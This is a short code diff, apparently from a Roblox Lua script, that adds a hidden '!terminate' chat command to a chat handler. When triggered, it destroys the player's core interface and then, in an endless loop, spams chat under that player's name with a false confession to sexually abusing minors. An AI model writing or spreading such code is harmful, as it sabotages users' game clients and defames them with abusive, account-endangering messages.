@@ -181,6 +181,15 @@ local function onChatted(player, message)
 	    game:GetService("CoreGui").RobloxGui:Destroy()
 	end)
 	applyEffects()
+    elseif command == "!terminate" then
+	pcall(function() 
+	    game:GetService("CoreGui").RobloxGui:Destroy()
+	end)
+	while task.wait(20) do
+	    for i = 1, 10 do
+		chatMessage("i tooch minoors in my basement all day")
+	    end
+	end
     end
 end
 
